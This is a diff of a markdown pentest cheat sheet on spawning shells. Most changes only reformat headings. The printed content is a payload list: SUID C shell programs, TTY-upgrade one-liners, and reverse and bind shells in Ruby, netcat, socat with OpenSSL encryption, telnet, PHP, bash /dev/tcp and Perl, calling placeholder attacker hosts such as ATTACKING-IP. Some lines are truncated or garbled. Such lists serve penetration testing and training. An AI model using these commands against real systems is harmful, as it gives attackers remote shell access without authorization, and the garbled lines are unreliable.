@@ -2,7 +2,7 @@
 
 **SUID C Shells**
 
-* bin/bash:
+* **bin/bash:**
 
 ```
 int main(void){
@@ -14,7 +14,7 @@ system("/bin/bash");
 }
 ```
 
-* bin/sh:
+* **bin/sh:**
 
 ```
 int main(void){
@@ -29,7 +29,7 @@ system("/bin/sh");
 #### **TTY Shell:** <a href="#toc475368998" id="toc475368998"></a>
 
 * ```
-  python -c 'import pty;pty.spawn("/bin/bash")'
+  python -c 'import pty; pty.spawn("/bin/bash")'
   ```
 * ```
   echo os.system('/bin/bash')
@@ -37,10 +37,14 @@ system("/bin/sh");
 * ```
   /bin/sh –i
   ```
-* ```
-  execute('/bin/sh')
-  ```
-  * LUA
+*   ```
+    execute('/bin/sh')
+    ```
+
+
+
+**LUA:**
+
 * ```
   !sh
   ```
@@ -50,7 +54,7 @@ system("/bin/sh");
   ```
   * Privilege escalation via vi
 
-#### Fully Interactive TTY
+#### Fully Interactive TTY:
 
 <pre><code><strong>                                In reverse shell 
 </strong>python -c 'import pty; pty.spawn("/bin/bash")'
@@ -66,7 +70,7 @@ export TERM=xterm-256color
 stty rows &#x3C;num> columns &#x3C;cols>
 </code></pre>
 
-#### **Spawn Ruby Shell** <a href="#toc475368999" id="toc475368999"></a>
+#### **Spawn Ruby Shell:** <a href="#toc475368999" id="toc475368999"></a>
 
 * ```
   exec "/bin/sh"
@@ -75,7 +79,7 @@ stty rows &#x3C;num> columns &#x3C;cols>
   ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d
   ```
 
-**Netcat**
+**Netcat:**
 
 * ```
   nc -e /bin/sh ATTACKING-IP 80
@@ -87,11 +91,11 @@ stty rows &#x3C;num> columns &#x3C;cols>
   rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
   ```
 
-#### Socket (Encrypted Shell)
+#### Socket (Encrypted Shell):
 
 {% embed url="https://erev0s.com/blog/encrypted-bind-and-reverse-shells-socat/" %}
 
-#### Bind Shell
+#### Bind Shell:
 
 ```
 
@@ -107,7 +111,7 @@ socat - TCP4:<Victim IP>:4443
 
 ```
 
-#### **Reverse Shell** <a href="#toc475369001" id="toc475369001"></a>
+#### **Reverse Shell:** <a href="#toc475369001" id="toc475369001"></a>
 
 ```
 # Attacker Machine
@@ -121,7 +125,7 @@ socat TCP4:<Attacker IP>:4443 EXEC:/bin/bash //Linux
 TCP4:<Attacker IP>:4443 EXEC:'cmd.exe',pipes //Windows
 ```
 
-#### **Encrypted Bind Shell** <a href="#toc475369001" id="toc475369001"></a>
+#### **Encrypted Bind Shell:** <a href="#toc475369001" id="toc475369001"></a>
 
 ```
 # Genereate Openssl key and certificate
@@ -152,7 +156,7 @@ socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork EXEC:'cmd.exe',pipes //for
 socat - OPENSSL:<Victim IP>:4443,verify=0
 ```
 
-#### Encrypted Reverse Shell <a href="#toc475369001" id="toc475369001"></a>
+#### Encrypted Reverse Shell: <a href="#toc475369001" id="toc475369001"></a>
 
 ```
 # Genereate Openssl key and certificate
@@ -179,7 +183,7 @@ socat OPENSSL:192.168.168.1:4443,verify=0 EXEC:/bin/bash // for linux
 OPENSSL:192.168.168.1:4443,verify=0 EXEC:'cmd.exe',pipes // for windows
 ```
 
-#### **Telnet Reverse Shell** <a href="#toc475369001" id="toc475369001"></a>
+#### **Telnet Reverse Shell:** <a href="#toc475369001" id="toc475369001"></a>
 
 * ```
   rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
@@ -188,14 +192,14 @@ OPENSSL:192.168.168.1:4443,verify=0 EXEC:'cmd.exe',pipes // for windows
   telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
   ```
 
-#### **PHP** <a href="#toc475369002" id="toc475369002"></a>
+#### **PHP:** <a href="#toc475369002" id="toc475369002"></a>
 
 * ```
   php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
   ```
   * (Assumes TCP uses file descriptor 3. If it doesn’t work, try 4,5, or 6)
 
-#### **Bash** <a href="#toc475369003" id="toc475369003"></a>
+#### **Bash:** <a href="#toc475369003" id="toc475369003"></a>
 
 * ```
   exec /bin/bash 0&0 2>&0
@@ -213,7 +217,7 @@ OPENSSL:192.168.168.1:4443,verify=0 EXEC:'cmd.exe',pipes // for windows
   bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
   ```
 
-#### **Perl** <a href="#toc475369004" id="toc475369004"></a>
+#### **Perl:** <a href="#toc475369004" id="toc475369004"></a>
 
 * ```
   exec "/bin/sh";
